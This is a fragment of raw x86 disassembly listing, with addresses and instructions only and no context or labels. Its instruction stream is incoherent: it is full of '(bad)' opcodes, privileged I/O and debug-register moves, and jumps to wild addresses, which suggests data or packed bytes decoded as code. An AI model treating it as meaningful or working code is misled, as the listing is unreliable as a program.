  43030c:	aas    
  43030d:	inc    ebp
  43030e:	(bad)  
  43030f:	lea    edi,[eax+edi*2-0x1]
  430313:	inc    edi
  430315:	mov    DWORD PTR ds:0x8000c7a0,edi
  43031b:	mov    ebp,esp
  43031d:	cld    
  43031e:	loop   0x4302ad
  430320:	inc    ebp
  430321:	(bad)  
  430322:	out    dx,al
  430323:	(bad)  
  430324:	fisttp WORD PTR [eax+0x8801c7]
  43032a:	jecxz  0x430371
  43032c:	in     al,dx
  43032d:	inc    DWORD PTR [ebp-0x4]
  430330:	out    0x8d,eax
  430332:	aas    
  430333:	(bad)  
  430334:	call   0xcb2e38
  430339:	add    DWORD PTR [ebx-0x7f490400],ecx
  43033f:	add    BYTE PTR [ecx],al
  430341:	test   DWORD PTR [eax],eax
  430343:	wrmsr  
  430345:	ja     0x430342
  430347:	add    BYTE PTR [eax],al
  430349:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  43034f:	add    esp,edi
  430351:	add    BYTE PTR [eax+0x450108],al
  430357:	mov    edi,DWORD PTR [ebp-0x6c]
  43035a:	add    DWORD PTR [eax],0x4
  43035d:	mov    eax,DWORD PTR [ebp+0x3]
  430360:	mov    edi,DWORD PTR [esp+edi*8]
  430363:	dec    ebp
  430364:	nop
  430365:	mov    eax,DWORD PTR [ecx]
  430367:	fadd   DWORD PTR [eax]
  430369:	add    BYTE PTR [ecx*4-0xafa000],dl
  430370:	inc    ebp
  430371:	push   edx
  430372:	call   DWORD PTR [ebp-0x7b]
  430375:	mov    esi,DWORD PTR [ebp-0x74]
  430378:	mov    eax,DWORD PTR [eax]
  43037a:	cld    
  43037b:	mov    eax,DWORD PTR [eax+0x880103]
  430381:	add    BYTE PTR [ebp+0x6a],bh
  430384:	cmp    edi,0x10
  430387:	mov    WORD PTR [ebp+0x0],es
  43038a:	mov    edx,DWORD PTR [edx-0x4]
  43038d:	push   ecx
  43038e:	nop
  43038f:	inc    DWORD PTR [ecx]
  430391:	cld    
  430392:	add    BYTE PTR [ebp-0x16],bh
  430395:	mov    eax,DWORD PTR [eax]
  430397:	cld    
  430398:	push   eax
  430399:	nop
  43039a:	inc    ebp
  43039b:	add    edi,edi
  43039d:	add    BYTE PTR [ebx+0x4de2f445],cl
  4303a3:	jmp    0xe33b:0x9403c733
  4303aa:	movntq QWORD PTR [edx],mm7
  4303ad:	mov    DWORD PTR [eax],0xb87e8b98
  4303b3:	test   ebx,eax
  4303b5:	jmp    DWORD PTR [ebp-0x1]
  4303b8:	int    0xed
  4303ba:	sub    esp,esi
  4303bc:	add    eax,DWORD PTR [ebp-0x30]
  4303bf:	fild   WORD PTR [ebp+0x3f]
  4303c2:	cmp    eax,edi
  4303c4:	je     0xc043e9ea
  4303ca:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  4303d1:	(bad)  
  4303d2:	jne    0x430360
  4303d4:	mov    ebx,ebp
  4303d6:	cld    
  4303d7:	jle    0x43041e
  4303d9:	dec    ecx
  4303da:	mov    eax,DWORD PTR [eax]
  4303dc:	mov    ah,0x50
  4303de:	add    BYTE PTR [ebp-0x18],al
  4303e1:	mov    ebp,DWORD PTR [ecx]
  4303e3:	test   al,0x0
  4303e5:	add    BYTE PTR [ebx-0x7f170301],cl
  4303eb:	add    DWORD PTR es:[eax],eax
  4303ee:	add    al,al
  4303f0:	xor    BYTE PTR [eax+0x4f],dl
  4303f3:	inc    ebp
  4303f4:	add    BYTE PTR [ebx+0xfcd88b],cl
  4303fa:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  430400:	add    DWORD PTR [ecx+0x458be845],ecx
  430406:	fmul   DWORD PTR [ebx+0x8bb800]
  43040c:	cld    
  43040d:	call   0xd82ed2
  430412:	dec    DWORD PTR [ebx+0x109ee8ff]
  430418:	add    al,al
  43041a:	push   eax
  43041b:	es inc ebp
  43041d:	inc    ebp
  43041e:	mov    ecx,DWORD PTR [ebx+0xd89c]
  430424:	dec    DWORD PTR [ebx-0x3ff70301]
  43042a:	mov    DWORD PTR gs:[eax],eax
  43042d:	call   0x8c134967
  430432:	sar    BYTE PTR [eax-0x17baffd8],0x8b
  430439:	sub    eax,ebx
  43043b:	add    BYTE PTR [eax],al
  43043d:	mov    ecx,DWORD PTR [ebx-0x3fef0318]
  430443:	inc    ebp
  430444:	push   ebp
  430445:	mov    ebp,eax
  430447:	shr    BYTE PTR [ecx],1
  430449:	ret    
  43044a:	add    dh,al
  43044c:	mov    eax,ecx
  43044e:	cld    
  43044f:	test   BYTE PTR [eax+0x101],al
  430455:	inc    ebp
  430456:	xor    BYTE PTR [ebx],dh
  430458:	push   edi
  430459:	mov    ecx,0xffe48d89
  43045e:	inc    ebp
  43045f:	enter  0x4d8b,0xfc
  430463:	mov    eax,ebx
  430465:	or     BYTE PTR [ebx+0x38732c1],bl
  43046b:	add    DWORD PTR [ebp-0xbac000],ecx
  430471:	add    al,ch
  430473:	add    BYTE PTR [ecx],ch
  430475:	inc    DWORD PTR [eax]
  430477:	cld    
  430478:	mov    edi,DWORD PTR [ebp-0xc]
  43047b:	mov    esi,DWORD PTR [ebp-0x4]
  43047e:	xor    edx,DWORD PTR [eax+0x8d0103]
  430484:	and    BYTE PTR [ebp+0x50e800ff],bl
  43048a:	sub    DWORD PTR [ebp+0x0],eax
  43048d:	mov    edi,edi
  43048f:	test   al,0xe4
  430491:	add    BYTE PTR [ebp-0x1],cl
  430494:	xor    ebp,eax
  430496:	add    esp,DWORD PTR [esi]
  430498:	cmp    eax,DWORD PTR [eax]
  43049a:	jne    0x4304e9
  43049c:	(bad)  
  43049d:	mov    ebx,eax
  43049f:	pushf  
  4304a0:	add    BYTE PTR [eax],al
  4304a2:	add    BYTE PTR [ecx-0x37474bb],cl
  4304a8:	or     BYTE PTR [eax+0x8401c3],bh
  4304ae:	fwait
  4304af:	jne    0x4304e3
  4304b1:	xor    ecx,DWORD PTR [ecx+0x457c088d]
  4304b7:	inc    DWORD PTR [ebp-0x74d68b18]
  4304bd:	add    BYTE PTR [eax+0x33fc4d8b],bh
  4304c3:	or     BYTE PTR [ebp+0x72000801],0x30
  4304ca:	add    BYTE PTR [edi+0x45],dl
  4304cd:	or     DWORD PTR [ebx-0x3c95471c],0xffffffff
  4304d4:	gs test ebp,ecx
  4304d7:	je     0x430504
  4304d9:	mov    eax,DWORD PTR [ebx]
  4304db:	cld    
  4304dc:	sar    BYTE PTR [eax+0x3b0145],1
  4304e2:	pcmpeqw mm4,mm2
  4304e5:	xor    edi,edi
  4304e7:	lea    ecx,[ebx-0x23927470]
  4304ed:	add    BYTE PTR [ebp+0x50],cl
  4304f0:	cmp    eax,DWORD PTR [ebp+0x75]
  4304f3:	mov    ebp,DWORD PTR [eax-0x68]
  4304f6:	test   DWORD PTR [eax],eax
  4304f8:	clc    
  4304f9:	push   DWORD PTR [ebp-0x1]
  4304fc:	lea    ecx,[eax]
  4304fe:	int3   
  4304ff:	inc    ebp
  430500:	call   0xfb3690
  430505:	jne    0x4304ff
  430507:	xor    edi,DWORD PTR [ebp-0x41]
  43050a:	jmp    0x43057e
  43050c:	mov    eax,DWORD PTR [eax]
  43050e:	mov    eax,0x339545c7
  430513:	inc    DWORD PTR [ebx]
  430515:	push   DWORD PTR [ecx]
  430517:	inc    ecx
  430518:	mov    eax,DWORD PTR [eax]
  43051a:	jmp    0x43056c
  43051c:	mov    eax,DWORD PTR [ebp-0x3c]
  43051f:	mov    eax,eax
  430521:	cld    
  430522:	clc    
  430523:	ret    
  430524:	test   bh,al
  430526:	pop    es
  430527:	xchg   ebp,eax
  430528:	add    bh,bh
  43052a:	inc    ebp
  43052b:	dec    DWORD PTR [edi]
  43052d:	sub    ebp,DWORD PTR [ebx]
  43052f:	add    BYTE PTR [eax],al
  430531:	push   eax
  430532:	jbe    0x430589
  430534:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  43053a:	or     al,0xcf
  43053c:	inc    eax
  43053d:	enter  0x745,0x72
  430541:	inc    ebp
  430542:	mov    eax,DWORD PTR [ecx]
  430544:	int3   
  430545:	add    BYTE PTR [ebp-0x75],al
  430548:	xor    DWORD PTR [eax+0x33c74d9c],edi
  43054e:	ror    BYTE PTR [ebp+0x72f80885],1
  430554:	inc    ebp
  430555:	add    BYTE PTR [ebx-0x3c7423bb],cl
  43055b:	fadd   st,st(6)
  43055d:	rol    BYTE PTR [ebp+0x12],0x8b
  430561:	inc    ebp
  430562:	fmul   QWORD PTR [ebx-0x3c39233d]
  430568:	inc    ebp
  430569:	test   bh,al
  43056b:	fwait
  43056c:	clc    
  43056d:	xor    al,BYTE PTR [ebp+0x45dcf889]
  430573:	inc    ebp
  430574:	xor    esi,DWORD PTR [ebx]
  430576:	pushf  
  430577:	mov    ecx,0xffb48dc7
  43057c:	test   eax,ecx
  43057e:	clc    
  43057f:	dec    ebp
  430580:	inc    ebp
  430581:	mov    edi,DWORD PTR ds:0xc7c19c08
  430587:	xchg   BYTE PTR [esi+edi*8-0x807007b],ah
  43058e:	inc    ebp
  43058f:	inc    ebp
  430590:	aas    
  430591:	mov    ebx,DWORD PTR [eax+ecx*1+0x18e8c8c7]
  430598:	test   DWORD PTR [ecx],esi
  43059a:	clc    
  43059b:	pushf  
  43059c:	inc    ebp
  43059d:	dec    DWORD PTR [ebx-0x3cba0f04]
  4305a3:	push   eax
  4305a4:	mov    BYTE PTR [edx],0x7d
  4305a7:	add    BYTE PTR [ebx],bh
  4305a9:	mov    ecx,DWORD PTR [edi]
  4305ab:	mov    DWORD PTR [eax],ebx
  4305ad:	les    eax,FWORD PTR [eax]
  4305af:	adc    ebp,ecx
  4305b1:	dec    ebp
  4305b2:	add    DWORD PTR [ebx-0x34ba3c00],ecx
  4305b8:	mov    ecx,esi
  4305ba:	lock or al,cl
  4305bd:	clc    
  4305be:	inc    ebp
  4305bf:	add    esi,DWORD PTR [ebx]
  4305c1:	jge    0x4305c6
  4305c3:	xor    edi,DWORD PTR [ebx]
  4305c5:	cmp    ecx,DWORD PTR [edi]
  4305c7:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  4305cc:	mov    edi,DWORD PTR [ecx]
  4305ce:	test   al,0xcc
  4305d0:	dec    ebp
  4305d1:	test   BYTE PTR [ebx],dh
  4305d3:	pop    es
  4305d4:	xor    eax,DWORD PTR [eax]
  4305d6:	add    ecx,DWORD PTR [esi]
  4305d8:	add    ecx,eax
  4305da:	psraw  mm0,mm1
  4305dd:	sub    BYTE PTR [ebp+0x38],cl
  4305e0:	mov    edi,DWORD PTR [ebx]
  4305e2:	lock int3 
  4305e4:	shl    edx,1
  4305e6:	rol    BYTE PTR [ebp+0xc],1
  4305e9:	mov    DWORD PTR [ebp-0x24],0xf8038533
  4305f0:	jmp    0x75063a
  4305f5:	pushf  
  4305f6:	inc    ebp
  4305f7:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  4305fd:	xor    ecx,ebx
  4305ff:	add    ecx,esi
  430601:	mov    esi,eax
  430603:	enter  0x45af,0x8b
  430607:	xor    ecx,eax
  430609:	add    edx,DWORD PTR [ebp-0x77]
  43060c:	sub    ecx,DWORD PTR [eax]
  43060e:	cmp    eax,DWORD PTR [ebp+0x77]
  430611:	ror    DWORD PTR [ebx-0x76385764],1
  430617:	test   al,0x0
  430619:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  43061f:	cmp    al,0x33
  430621:	pushf  
  430622:	xor    eax,edi
  430624:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  43062b:	inc    ebp
  43062c:	dec    ebp
  43062d:	mov    ebx,DWORD PTR ds:[eax+esi*8-0x2f432e39]
  430635:	test   DWORD PTR ds:0xeb4545f8,eax
  43063b:	cmp    BYTE PTR [ebx+0x4d8ba49c],cl
  430641:	fdiv   QWORD PTR [ebx]
  430643:	dec    ebp
  430644:	xor    esi,DWORD PTR [ebx]
  430646:	add    eax,DWORD PTR [ebx]
  430648:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  43064e:	dec    ebp
  43064f:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  430655:	out    dx,eax
  430656:	rol    BYTE PTR [eax],1
  430658:	add    eax,0xebc8458b
  43065d:	dec    ebp
  43065e:	mov    ebp,DWORD PTR [ebx]
  430660:	mov    esp,0x33f84d8b
  430665:	ret    
  430666:	xor    eax,esi
  430668:	add    ecx,eax
  43066a:	add    eax,DWORD PTR [edx+0xc1010f]
  430670:	dec    ebp
  430671:	inc    ebp
  430672:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  430678:	ror    bl,1
  43067a:	add    eax,0xebc645ce
  43067f:	scas   eax,DWORD PTR es:[edi]
  430680:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  430686:	xor    ebp,DWORD PTR [ebx]
  430688:	xor    edi,DWORD PTR [ebx]
  43068a:	add    esi,DWORD PTR [edi+0x3]
  43068d:	mov    ecx,DWORD PTR [edi]
  43068f:	clc    
  430690:	rol    ebx,0x4d
  430693:	(bad)  
  430694:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  43069b:	mov    ah,0x45
  43069d:	dec    ebp
  43069e:	jbe    0x4306d3
  4306a0:	mov    esi,DWORD PTR [ebx]
  4306a2:	call   0x334653aa
  4306a7:	rdpmc  
  4306a9:	rol    DWORD PTR [ebx],0x4d
  4306ac:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  4306b2:	inc    ebp
  4306b3:	ror    BYTE PTR [ebx+0x45450808],1
  4306b9:	jmp    0x10b0749
  4306be:	inc    ebp
  4306bf:	inc    ebp
  4306c0:	(bad)  
  4306c1:	mov    ebx,eax
  4306c3:	clc    
  4306c4:	test   ebx,eax
  4306c6:	clc    
  4306c7:	retf   
  4306c8:	inc    ebp
  4306c9:	into   
  4306ca:	mov    esi,0x8b85afec
  4306d0:	clc    
  4306d1:	enter  0x5545,0x33
  4306d5:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  4306dc:	ret    
  4306dd:	mov    ah,0xc6
  4306df:	addr16 push 0x338b4545
  4306e5:	clc    
  4306e6:	add    eax,ebx
  4306e8:	loopne 0x4306b5
  4306ea:	dec    ebp
  4306eb:	into   
  4306ec:	mov    al,dh
  4306ee:	or     BYTE PTR [edi-0x37ff748e],ch
  4306f4:	inc    ebp
  4306f5:	push   ebp
  4306f6:	mov    ebp,DWORD PTR [ebx]
  4306f8:	in     al,dx
  4306f9:	cmp    eax,ebx
  4306fb:	ja     0x430742
  4306fd:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  430703:	inc    ebp
  430704:	fwait
  430705:	mov    esi,DWORD PTR [edx]
  430707:	clc    
  430708:	mov    bl,al
  43070a:	xlat   BYTE PTR ds:[ebx]
  43070b:	retf   
  43070c:	inc    ebp
  43070d:	into   
  43070e:	mov    eax,esi
  430710:	in     al,dx
  430711:	scas   eax,DWORD PTR es:[edi]
  430712:	retf   
  430713:	mov    ecx,DWORD PTR [ebp-0x38]
  430716:	mov    edx,DWORD PTR [ebp-0x24]
  430719:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8865]
  430720:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  430727:	mov    eax,DWORD PTR [ebx]
  430729:	clc    
  43072a:	loopne 0x4306ef
  43072c:	push   ebp
  43072d:	retf   
  43072e:	mov    dh,al
  430730:	adc    esi,ecx
  430732:	jb     0x4306e3
  430734:	add    BYTE PTR [ebx+0x558bc845],cl
  43073a:	in     al,dx
  43073b:	sub    eax,ebx
  43073d:	cmp    ecx,ebx
  43073f:	mov    eax,esi
  430741:	mov    esp,0x45af03ce
  430746:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  43074c:	mov    eax,ebx
  43074e:	in     al,dx
  43074f:	into   
  430750:	dec    ebp
  430751:	(bad)  
  430752:	xor    ebp,DWORD PTR [edi+0x80f8903]
  430758:	rol    DWORD PTR [ebp+0x4d],0x89
  43075c:	xor    esp,esp
  43075e:	sub    eax,DWORD PTR [ebp-0x75]
  430761:	add    ebp,esp
  430763:	mov    al,0x55
  430765:	inc    ebp
  430766:	xor    esi,DWORD PTR [ecx]
  430768:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  43076f:	inc    ebp
  430770:	xor    esi,DWORD PTR [edx]
  430772:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  430779:	test   DWORD PTR [eax],eax
  43077b:	clc    
  43077c:	enter  0x8645,0x33
  430780:	inc    DWORD PTR [ebx]
  430782:	(bad)  
  430783:	jmp    0x4307ca
  430785:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  43078b:	inc    ebp
  43078c:	(bad)  
  43078d:	mov    ebp,DWORD PTR [edi-0x277b7424]
  430793:	fwait
  430794:	retf   
  430795:	xor    al,cl
  430797:	mov    BYTE PTR [ebp+0xb],cl
  43079a:	lea    eax,[ebp+0x8]
  43079d:	xor    esi,DWORD PTR [edx+0x3]
  4307a0:	add    al,ah
  4307a2:	inc    ebp
  4307a3:	dec    ebp
  4307a4:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  4307aa:	gs add ch,cl
  4307ad:	inc    ebp
  4307ae:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  4307b4:	inc    ebp
  4307b5:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  4307bb:	push   ebp
  4307bc:	(bad)  
  4307bd:	mov    BYTE PTR [edi+0xf723b11],ch
  4307c3:	add    ch,ch
  4307c5:	inc    ebp
  4307c6:	dec    DWORD PTR [ebx-0x34332775]
  4307cc:	add    al,0x4d
  4307ce:	inc    ebp
  4307cf:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  4307d5:	fwait
  4307d6:	add    DWORD PTR [edx],esi
  4307d8:	add    BYTE PTR [ebx+0x4d00c000],cl
  4307de:	push   DWORD PTR [ebx]
  4307e0:	int3   
  4307e1:	xor    eax,DWORD PTR [eax]
  4307e3:	add    edx,DWORD PTR [eax+0x3]
  4307e6:	mov    DWORD PTR [edi],ecx
  4307e8:	call   0x4288c8ae
  4307ed:	mov    DWORD PTR [ebp-0x20],esp
  4307f0:	add    BYTE PTR [ebp+0x7d],al
  4307f3:	mov    eax,DWORD PTR [eax]
  4307f5:	in     al,0x15
  4307f7:	ret    
  4307f8:	iret   
  4307f9:	(bad)  
  4307fa:	enter  0x14af,0x8b
  4307fe:	(bad)  
  4307ff:	in     al,dx
  430800:	or     bl,cl
  430802:	adc    cl,al
  430804:	push   ebp
  430805:	dec    ebp
  430806:	inc    eax
  430807:	mov    edx,DWORD PTR [ebp-0x20]
  43080a:	jb     0x4307d7
  43080c:	mov    ecx,esi
  43080e:	cld    
  43080f:	scas   eax,DWORD PTR es:[edi]
  430810:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  430817:	mov    BYTE PTR [eax],0x8c
  43081a:	push   0xffffff9b
  43081c:	push   edi
  43081d:	xor    dl,BYTE PTR [eax+0x3b]
  430820:	mov    ecx,DWORD PTR [edi]
  430822:	call   0x8c424d85
  430827:	mov    eax,eax
  430829:	in     al,dx
  43082a:	jge    0x430879
  43082c:	mov    DWORD PTR [ebx],esi
  43082e:	int3   
  43082f:	add    eax,DWORD PTR [ebp+0xf]
  430832:	xor    eax,ecx
  430834:	(bad)  
  430835:	dec    ebp
  430836:	pushf  
  430837:	xor    ecx,esi
  430839:	add    edi,DWORD PTR [edi]
  43083b:	mov    eax,DWORD PTR [ebp-0x38]
  43083e:	(bad)  
  43083f:	test   dh,dl
  430841:	fwait
  430842:	add    esi,DWORD PTR [edx]
  430844:	jmp    0x4307cf
  430846:	mov    cl,al
  430848:	add    eax,0x14330f45
  43084d:	mov    ecx,0xff468d80
  430852:	jmp    0xc990181f
  430857:	mov    edx,ecx
  430859:	rol    BYTE PTR [ebp+0x330155],1
  43085f:	add    ecx,DWORD PTR [ebp+0xf]
  430862:	xor    eax,edx
  430864:	(bad)  
  430865:	ror    DWORD PTR [eax],0x86
  430868:	jb     0x430867
  43086a:	add    bh,bh
  43086c:	clc    
  43086d:	inc    ebp
  43086e:	jb     0x4308da
  430870:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  430876:	xor    DWORD PTR [ebx+0xc7d89c],ecx
  43087c:	shr    BYTE PTR [eax-0x3d],0x30
  430880:	clc    
  430881:	add    BYTE PTR [ebp+0x75],al
  430884:	xor    DWORD PTR [edx-0x64],ebp
  430887:	inc    edi
  430889:	adc    al,0xe8
  43088b:	inc    ebp
  43088c:	test   DWORD PTR [ebp-0x7cba8b08],eax
  430892:	mov    ecx,DWORD PTR [eax]
  430894:	cld    
  430895:	or     DWORD PTR [ebp-0x34],0x33
  430899:	jbe    0x43089e
  43089b:	mov    edx,DWORD PTR [ecx+0x2b]
  43089e:	dec    ebp
  43089f:	mov    cl,BYTE PTR [ebx+0x45d801]
  4308a5:	mov    BYTE PTR [ebx],dh
  4308a7:	mov    eax,DWORD PTR [ebx]
  4308a9:	or     BYTE PTR [ecx+0x3b],dl
  4308ac:	dec    ebp
  4308ad:	int3   
  4308ae:	xor    ebp,edi
  4308b0:	add    eax,DWORD PTR [ebp+0x51]
  4308b3:	mov    ecx,DWORD PTR [ebp-0x28]
  4308b6:	xor    eax,DWORD PTR [eax]
  4308b8:	add    ebp,DWORD PTR [eax+0x51]
  4308bb:	adc    BYTE PTR [eax+0x0],0x8b
  4308bf:	add    BYTE PTR [ebx+0x4d18fcff],cl
  4308c5:	inc    ebp
  4308c6:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  4308cc:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  4308d2:	dec    ebp
  4308d3:	mov    esi,DWORD PTR [ebx]
  4308d5:	hlt    
  4308d6:	add    eax,ebx
  4308d8:	push   ecx
  4308d9:	inc    ebp
  4308da:	dec    ebp
  4308db:	(bad)  
  4308dc:	call   esi
  4308de:	in     al,0xc7
  4308e0:	retf   
  4308e1:	mov    al,ds:0xc5ff3dce
  4308e6:	adc    al,0xc6
  4308e8:	inc    ebp
  4308e9:	and    eax,0x9c0f4c85
  4308ee:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  4308f5:	cmp    BYTE PTR [ebx+0x38],0x0
  4308f9:	mov    dh,0xc7
  4308fb:	cmp    eax,eax
  4308fd:	jne    0x45440149
  430903:	mov    esi,DWORD PTR [ebx]
  430905:	mov    eax,0x848bcb9c
  43090a:	rcr    BYTE PTR [ebx-0x7c7fcd0f],0x65
  430911:	or     BYTE PTR [edi],cl
  430913:	(bad)  
  430914:	dec    ebp
  430915:	inc    edi
  430916:	add    bh,0x54
  430919:	or     cl,ch
  43091b:	test   DWORD PTR [eax+0x4d4501f8],ecx
  430921:	add    BYTE PTR [eax-0x1638ab64],0xbc
  430928:	mov    BYTE PTR [ebp+0x45a5f802],dh
  43092e:	(bad)  
  43092f:	cmp    eax,0x89839cff
  430934:	je     0x43091a
  430936:	inc    DWORD PTR [ebp+0x0]
  430939:	mov    ecx,DWORD PTR [ebp-0x340018]
  43093f:	into   
  430940:	dec    DWORD PTR [ebx-0x7f72431c]
  430946:	push   0x5000ff01
  43094b:	retf   
  43094c:	inc    ebp
  43094d:	into   
  43094e:	dec    DWORD PTR [ebx-0x343f3ff4]
  430954:	push   eax
  430955:	into   
  430956:	call   0x4b0de6
  43095b:	retf   
  43095c:	add    dh,cl
  43095e:	add    bh,bh
  430960:	mov    DWORD PTR [eax+ecx*1],edx
  430963:	clc    
  430964:	inc    ebp
  430965:	inc    ebp
  430966:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  43096c:	push   0x1
  43096e:	push   edi
  43096f:	add    BYTE PTR [eax-0x35],dl
  430972:	mov    ecx,esi
  430974:	cld    
  430975:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  43097b:	into   
  43097c:	ror    BYTE PTR [ebx+0x75000800],0x50
  430983:	xor    eax,DWORD PTR [ebp+0x3]
  430986:	jne    0x4309d9
  430988:	call   DWORD PTR [eax-0x3c]
  43098b:	mov    DWORD PTR [ecx-0x18],edx
  43098e:	mov    edi,edi
  430990:	call   0x8b464f19
  430995:	add    ah,ah
  430997:	rol    BYTE PTR [ebp-0x7c],0xeb
  43099b:	add    edi,edi
  43099d:	add    al,ch
  43099f:	inc    ebp
  4309a0:	push   ecx
  4309a1:	cmp    al,0x8b
  4309a3:	pushf  
  4309a4:	(bad)  
  4309a5:	mov    DWORD PTR [ebp-0x50],0xf8e485c7
  4309ac:	test   DWORD PTR [ebp-0x8],ecx
  4309af:	add    BYTE PTR [ebp+0x54],0x32
  4309b3:	jmp    0x8bcc9254
  4309b8:	in     al,dx
  4309b9:	or     BYTE PTR [ebp-0xf],al
  4309bc:	xor    eax,DWORD PTR [eax+0x4f896503]
  4309c2:	hlt    
  4309c3:	mov    eax,DWORD PTR [ebp-0x50]
  4309c6:	xor    esi,ecx
  4309c8:	add    eax,DWORD PTR [eax+0x4f086589]
  4309ce:	inc    ebp
  4309cf:	adc    ecx,0x68
  4309d2:	pushf  
  4309d3:	inc    edi
  4309d5:	add    al,ch
  4309d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4309d8:	test   edi,edi
  4309da:	clc    
  4309db:	inc    DWORD PTR [ebp-0x73]
  4309de:	cmp    al,0x74
  4309e0:	pushf  
  4309e1:	inc    edi
  4309e3:	push   ecx
  4309e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4309e5:	jne    0x43096c
  4309e7:	push   eax
  4309e8:	clc    
  4309e9:	test   DWORD PTR [ebp-0x1],eax
  4309ec:	call   FWORD PTR ds:[ebx+ecx*4+0x70b4c4c7]
  4309f4:	test   DWORD PTR [ebx+0x574510f8],eax
  4309fa:	cmp    BYTE PTR [edx],bl
  4309fc:	pushf  
  4309fd:	add    BYTE PTR [ebx+0x4d80e468],cl
  430a03:	add    BYTE PTR [ebx],dh
  430a05:	inc    ebp
  430a06:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  430a0c:	enter  0x8401,0x0
  430a10:	add    al,BYTE PTR [eax]
  430a12:	add    bh,bh
  430a14:	out    dx,eax
  430a15:	sbb    BYTE PTR [eax],al
  430a17:	dec    ebp
  430a18:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  430a1e:	sub    esi,DWORD PTR [ebx]
  430a20:	mov    ebp,DWORD PTR [eax-0x8]
  430a23:	add    bl,0x0
  430a26:	(bad)  
  430a27:	cmp    eax,ecx
  430a29:	or     BYTE PTR [edx+0x750114],al
  430a2f:	inc    DWORD PTR [ebp+0x18]
  430a32:	mov    eax,DWORD PTR [ebp-0x8]
  430a35:	mov    ebx,eax
  430a37:	(bad)  
  430a38:	retf   
  430a39:	inc    ebp
  430a3a:	into   
  430a3b:	mov    esi,eax
  430a3d:	int3   
  430a3e:	scas   eax,DWORD PTR es:[edi]
  430a3f:	push   es
  430a40:	mov    esi,DWORD PTR [ebp-0xc]
  430a43:	call   DWORD PTR [ebp+0x18]
  430a46:	sub    edi,DWORD PTR [ebp+0x3b]
  430a49:	mov    esi,DWORD PTR [edi-0x34]
  430a4c:	mov    eax,DWORD PTR [ebp-0x8]
  430a4f:	xor    ebx,eax
  430a51:	pushf  
  430a52:	mov    bh,0xbc
  430a55:	fadd   QWORD PTR [eax]
  430a57:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  430a5d:	mov    esi,DWORD PTR [ebx]
  430a5f:	in     al,0x33
  430a61:	ret    
  430a62:	add    eax,esi
  430a64:	add    eax,DWORD PTR [ebp+0xf]
  430a67:	mov    eax,ecx
  430a69:	in     al,0x4d
  430a6b:	ret    
  430a6c:	mov    eax,esi
  430a6e:	in     al,dx
  430a6f:	inc    ebp
  430a70:	rol    edi,1
  430a72:	sar    al,1
  430a74:	or     BYTE PTR [ebp+0x45e9f845],al
  430a7a:	add    BYTE PTR [ebx],dh
  430a7c:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  430a83:	test   ebx,eax
  430a85:	clc    
  430a86:	retf   
  430a87:	inc    ebp
  430a88:	into   
  430a89:	cmp    eax,0xc7af9cc6
  430a8e:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  430a95:	inc    ebp
  430a96:	cmp    edi,DWORD PTR [edi]
  430a98:	ja     0x430a36
  430a9a:	mov    eax,edi
  430a9c:	mov    esp,0x458567a8
  430aa1:	clc    
  430aa2:	mov    eax,DWORD PTR [ebp-0x8]
  430aa5:	mov    eax,ebx
  430aa7:	in     al,dx
  430aa8:	retf   
  430aa9:	ret    
  430aaa:	into   
  430aab:	mov    dh,0x7d
  430aae:	scas   eax,DWORD PTR es:[edi]
  430aaf:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  430ab5:	add    BYTE PTR [ebx],ch
  430ab7:	jmp    0xba0bf7
  430abc:	mov    eax,DWORD PTR [ebp-0x5c]
  430abf:	mov    eax,DWORD PTR [ebp-0x14]
  430ac2:	inc    ebp
  430ac3:	enter  0x458b,0xf8
  430ac7:	xor    eax,ebx
  430ac9:	add    ecx,ebx
  430acb:	cmp    ecx,esi
  430acd:	shufps xmm7,xmm4,0xaf
  430ad1:	add    BYTE PTR [ebx+0x55e8f48b],cl
  430ad7:	dec    ebp
  430ad8:	sub    esi,DWORD PTR [ebx]
  430ada:	cmp    esi,DWORD PTR [ebx]
  430adc:	ja     0x430ae1
  430ade:	mov    eax,DWORD PTR [ebx]
  430ae0:	lods   al,BYTE PTR ds:[esi]
  430ae1:	mov    db0,ecx
  430ae4:	inc    ebp
  430ae5:	dec    ebp
  430ae6:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  430aec:	retf   
  430aed:	rol    dh,1
  430aef:	or     al,0xce
  430af1:	inc    ebp
